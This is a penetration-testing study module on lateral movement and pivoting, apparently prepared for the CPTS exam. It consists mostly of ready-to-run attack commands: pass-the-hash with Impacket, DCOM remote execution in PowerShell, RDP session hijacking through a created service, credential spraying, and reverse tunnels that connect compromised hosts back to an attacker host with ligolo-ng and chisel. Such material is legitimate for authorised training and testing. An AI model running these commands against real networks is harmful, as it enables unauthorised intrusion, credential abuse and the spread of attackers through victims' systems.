# Module 12: Lateral Movement & Pivoting

## When to Use This Module
Use this module when you have a foothold on a host and need to move to other hosts/networks. Lateral movement covers credential-based movement within the same network. Pivoting covers reaching segmented networks through a compromised host.

## Prerequisites
- Credentials (cleartext or NT hash) for target hosts
- OR shell access on a pivot host (dual-homed or network-connected)
- Tools on attack host: impacket, ligolo-ng, chisel, sshuttle

## Entry Check

```
Shell or creds obtained on host?
├── Check current host's network:
│   ├── ipconfig / ifconfig → All interfaces
│   ├── netstat -rn → Routing table
│   ├── arp -a → ARP cache (other hosts this host talks to)
│   └── nmap from this host → Other subnets visible?
├── Multi-homed host (2+ NICs)?
│   ├── Yes → Deploy pivot tool → Module 12
│   └── No → Check lateral movement options below
└── Creds available for other hosts?
    ├── Yes → Try lateral movement
    └── No → Credential harvesting → Module 13
```

## Lateral Movement Methods

```
Creds available?
├── Which type?
│   ├── Cleartext password
│   │   ├── SSH: ssh user@target
│   │   ├── RDP: xfreerdp /v:target /u:user /p:pass
│   │   ├── WinRM: evil-winrm -i target -u user -p pass
│   │   ├── SMB: netexec smb target -u user -p pass -x whoami
│   │   ├── MSSQL: mssqlclient.py user:pass@target
│   │   └── PSExec: psexec.py domain/user:pass@target
│   │
│   └── NT hash only (pass-the-hash)
│       ├── SMB: netexec smb target -u user -H hash -x whoami
│       ├── RDP: xfreerdp /v:target /u:user /pth:hash
│       │   ⚠ Requires Restricted Admin Mode (DisableRestrictedAdmin=0 on target)
│       ├── WinRM: evil-winrm -i target -u user -H hash
│       ├── PSExec: psexec.py -hashes hash domain/user@target
│       ├── WMI: wmiexec.py -hashes hash domain/user@target
│       └── SMB exec: smbexec.py -hashes hash domain/user@target
│
├── Which protocol works?
│   ├── Check open ports first:
│   │   ├── 445 (SMB) → PSExec, SMBexec, WMIexec
│   │   ├── 5985/5986 (WinRM) → evil-winrm
│   │   ├── 3389 (RDP) → xfreerdp
│   │   ├── 22 (SSH) → ssh
│   │   └── 135 (WMI) → wmiexec.py
│   └── Try most reliable first: SMB → WMI → WinRM
│
└── Overpass-the-Hash (Kerberos)
    └── Use NTLM hash to request Kerberos TGT → Pass-the-Ticket
```

### Pass-the-Hash (Impacket Suite)

```bash
# All take -hashes LMHASH:NTHASH or -hashes :NTHASH

psexec.py domain/user@target -hashes :NTHASH
wmiexec.py domain/user@target -hashes :NTHASH
smbexec.py domain/user@target -hashes :NTHASH
atexec.py domain/user@target -hashes :NTHASH  # Scheduled task
dcomexec.py domain/user@target -hashes :NTHASH
```

### DCOM Lateral Movement

```bash
# DCOM methods bypass some detections (no SMB exec, no service creation)
# All require credentials + target must have DCOM enabled (default on Windows)

# MMC20.Application (most common DCOM lateral)
python3 mmcexec.py domain/user:pass@target
# Manual via PowerShell:
$com = [Type]::GetTypeFromProgID("MMC20.Application","target")
$com.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc.exe","7")

# ShellWindows
$com = [Activator]::CreateInstance([Type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","target"))
$com.Item().Document.Application.ShellExecute("cmd.exe","/c calc.exe","c:\","open",0)

# ShellBrowserWindow (Windows 10+)
$com = [Activator]::CreateInstance([Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","target"))
$com.Document.Application.ShellExecute("cmd.exe","/c calc.exe","c:\","open",0)

# ExcelDcom (if Excel installed)
python3 xlexec.py domain/user:pass@target
```

### PowerShell Remoting

```bash
# Enter-PSSession (interactive, requires WinRM on target)
Enter-PSSession -ComputerName target -Credential domain\user
# With hash:
Enter-PSSession -ComputerName target -Credential domain\user -Authentication Negotiate

# Invoke-Command (non-interactive, runs on multiple hosts)
Invoke-Command -ComputerName target -ScriptBlock { whoami } -Credential domain\user
Invoke-Command -ComputerName target1,target2 -ScriptBlock { ipconfig } -Credential domain\user

# PowerShell remoting over HTTP (5985) vs HTTPS (5986):
#   5985 = HTTP (default, plaintext over wire but NTLM/Kerberos encrypted)
#   5986 = HTTPS (requires certificate, more secure)
# evil-winrm uses 5985 by default. For 5986: evil-winrm -i target -S -u user -p pass

# Enable PowerShell remoting on compromised host (if needed):
Enable-PSRemoting -Force
```

### RDP Session Hijacking (SYSTEM required)

```bash
# List RDP sessions
query user
# OR: qwinsta

# Hijack session (requires SYSTEM)
tscon <SESSION_ID> /dest:console
# Example: tscon 2 /dest:console  (takes over session 2)

# If you get "Access Denied" without SYSTEM:
# Use tscon with service context:
sc create sesshijack binpath= "cmd.exe /k tscon <ID> /dest:console"
sc start sesshijack
```

## Pivoting Methods

```
New subnet discovered?
├── Which pivot tool?
├── Ligolo-ng (recommended for full VPN-like tunnel)
│   ├── Attacker: ligolo-proxy -selfcert
│   ├── Target: ./ligolo-agent -connect <ATTACKER>:11601 -ignore-cert
│   └── Then: sudo ip route add <new_subnet>/24 dev ligolo
│
├── Chisel (fast, uses HTTP/SSH over single TCP)
│   ├── Attacker: chisel server -p 8000 --reverse
│   ├── Target: chisel client <ATTACKER>:8000 R:1080:socks
│   └── Then: proxychains nmap -sT -sV target_in_new_subnet
│
├── SSHuttle (simple, for full VPN tunnel over SSH)
│   ├── sshuttle -r user@target 10.10.0.0/24
│   └── No proxychains needed — direct connections
│
├── SSH port forwarding
│   ├── Local: ssh -L 8080:internal:80 user@jumphost
│   ├── Remote: ssh -R 8080:attacker:80 user@jumphost
│   └── Dynamic SOCKS: ssh -D 1080 user@jumphost
│
├── Metasploit pivot
│   └── route add <subnet> <mask> <session>
│
└── Proxychains (with any SOCKS proxy)
    └── proxychains [command]
        └── config: /etc/proxychains4.conf
```

### Double-Pivoting (Pivot Through a Pivot)

```
Multi-subnet environments require chaining pivots. Critical for CPTS exams
with 3+ subnets (e.g., DMZ → Internal → DC subnet).

Method 1 — Chisel chain (SOCKS over SOCKS):
├── Pivot 1 (attacker → host1): chisel server -p 8000 --reverse (attacker)
│                              chisel client attacker:8000 R:1080:socks (host1)
├── Pivot 2 (host1 → host2): chisel server -p 8001 --reverse (host1)
│                             chisel client host1:8001 R:1081:socks (host2)
└── Use: proxychains -f /etc/proxychains-double.conf <command>
    (config: socks5 127.0.0.1 1080 then socks5 127.0.0.1 1081)

Method 2 — Ligolo-ng chain:
├── Pivot 1: Connect ligolo-agent on host1 → ligolo interface on attacker
├── Pivot 2: From host1, connect ligolo-agent on host2 → second ligolo interface
└── Route: ip route add <subnet3>/24 dev ligolo2

Method 3 — SSH chain:
├── ssh -D 1080 user@host1 (first SOCKS)
├── proxychains ssh -D 1081 user@host2 (second SOCKS through first)
└── proxychains -f proxychains-double.conf <command>

⚠ Scanning through double-pivots is VERY slow:
  ├── Use nmap -sT -Pn -n --min-rate 100 (TCP connect, no ping, no DNS)
  ├── Avoid -sV through double pivot (too slow) — identify by banner grab
  └── Consider masscan through pivot for fast port discovery
```

### Decision: Which Pivot Tool?

```
Pivot requirement:
├── Need full subnet access? → Ligolo-ng or SSHuttle
├── Limited tools on target (no root)?
│   └── Chisel (single binary, no root needed for client)
├── Need only port forwarding? → SSH -L
├── Need browser/web app pivoting? → Burp upstream proxy + Chisel
└── Windows target?
    ├── Ligolo-ng (has Windows agent)
    ├── Chisel (Windows binary)
    └── SocksOverRDP (if RDP available)
```

## Post-Pivot Actions

```
New subnet reachable?
├── MUST DO (immediately):
│   ├── Determine if new subnet uses different creds
│   ├── Run netexec to scan for live hosts
│   ├── Spray known creds against new hosts
│   └── Check for pass-the-hash opportunities
├── Run nmap through pivot:
│   └── proxychains nmap -sT -sV -Pn <new_target>
├── Run service/port scans on new hosts
├── Check for AD domain overlap
└── Web scan new hosts for applications
```

## Cross-References
- For AD lateral movement via creds → [Module 11: Active Directory](11-active-directory.md)
- For finding creds to use → [Module 13: Post-Exploitation](13-post-exploitation.md)
- For cracking captured hashes → [Module 06: Password Attacks](06-password-attacks.md)
- Ligolo-ng setup → [assets/cheatsheets/ligolo.md](../assets/cheatsheets/ligolo.md)

## Output Summary
- [ ] Current host network fully enumerated
- [ ] Credential-based lateral movement attempted
- [ ] Pass-the-hash attempted where applicable
- [ ] Pivot tool deployed on multi-homed host
- [ ] New subnet(s) scanned from pivot
- [ ] All new hosts documented
- [ ] Access to new subnet achieved
